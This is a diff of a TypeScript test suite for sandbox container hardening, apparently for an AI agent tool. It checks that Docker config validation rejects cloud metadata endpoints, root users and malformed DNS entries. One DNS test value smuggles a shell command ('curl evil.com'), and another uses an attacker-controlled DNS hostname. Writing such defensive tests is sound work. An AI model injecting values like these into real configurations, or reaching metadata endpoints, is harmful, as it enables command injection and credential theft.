@@ -63,11 +63,11 @@ describe("sandbox container hardening schema", () => {
   });
 
   // ═══════════════════════════════════════════════════════════════════════
-  // SBX-MEDIUM-02: extraHosts validation
+  // SBX-MEDIUM-01 (cont): extraHosts validation
   // ═══════════════════════════════════════════════════════════════════════
 
   describe("sandbox.docker.extraHosts — validated host entries", () => {
-    it("accepts valid hostname:ip entries", () => {
+    it("accepts valid hostname:ipv4 entries", () => {
       const res = validateConfigObject({
         agents: {
           defaults: {
@@ -80,7 +80,20 @@ describe("sandbox container hardening schema", () => {
       expect(res.ok).toBe(true);
     });
 
-    it("rejects cloud metadata IP (169.254.169.254)", () => {
+    it("accepts valid hostname:ipv6 entries", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { extraHosts: ["myhost:2001:db8::1"] },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(true);
+    });
+
+    it("rejects cloud metadata IP (169.254.169.254 — AWS/GCP/Azure SSRF)", () => {
       const res = validateConfigObject({
         agents: {
           defaults: {
@@ -93,7 +106,20 @@ describe("sandbox container hardening schema", () => {
       expect(res.ok).toBe(false);
     });
 
-    it("rejects malformed extraHosts entries", () => {
+    it("rejects EC2 IPv6 metadata endpoint (fd00:ec2::254)", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { extraHosts: ["metadata:fd00:ec2::254"] },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(false);
+    });
+
+    it("rejects malformed extraHosts entries (no colon)", () => {
       const res = validateConfigObject({
         agents: {
           defaults: {
@@ -121,6 +147,64 @@ describe("sandbox container hardening schema", () => {
   });
 
   // ═══════════════════════════════════════════════════════════════════════
+  // DNS validation
+  // ═══════════════════════════════════════════════════════════════════════
+
+  describe("sandbox.docker.dns — validated IP addresses", () => {
+    it("accepts valid IPv4 DNS server", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { dns: ["8.8.8.8", "1.1.1.1"] },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(true);
+    });
+
+    it("accepts valid IPv6 DNS server", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { dns: ["2001:4860:4860::8888"] },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(true);
+    });
+
+    it("rejects hostname as DNS (only IPs allowed)", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { dns: ["evil.dns.attacker.com"] },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(false);
+    });
+
+    it("rejects DNS entry with shell injection", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { dns: ["8.8.8.8; curl evil.com"] },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(false);
+    });
+  });
+
+  // ═══════════════════════════════════════════════════════════════════════
   // SBX-MEDIUM-03: user field validation
   // ═══════════════════════════════════════════════════════════════════════
 
@@ -131,6 +215,19 @@ describe("sandbox container hardening schema", () => {
           defaults: {
             sandbox: {
               docker: { user: "root" },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(false);
+    });
+
+    it("rejects user=Root (case insensitive)", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { user: "Root" },
             },
           },
         },
@@ -164,7 +261,20 @@ describe("sandbox container hardening schema", () => {
       expect(res.ok).toBe(false);
     });
 
-    it("accepts non-root user", () => {
+    it("rejects user=0:1000 (root user with non-root group)", () => {
+      const res = validateConfigObject({
+        agents: {
+          defaults: {
+            sandbox: {
+              docker: { user: "0:1000" },
+            },
+          },
+        },
+      });
+      expect(res.ok).toBe(false);
+    });
+
+    it("accepts non-root user name", () => {
       const res = validateConfigObject({
         agents: {
           defaults: {
@@ -205,7 +315,8 @@ describe("sandbox container hardening schema", () => {
   });
 
   // ═══════════════════════════════════════════════════════════════════════
-  // Existing sandbox config security regression
+  // Cross-layer regression: docker image and workspace security
+  // (Primary tests in config.schema-security-hardening.test.ts)
   // ═══════════════════════════════════════════════════════════════════════
 
   describe("regression — docker image and workspace path security", () => {
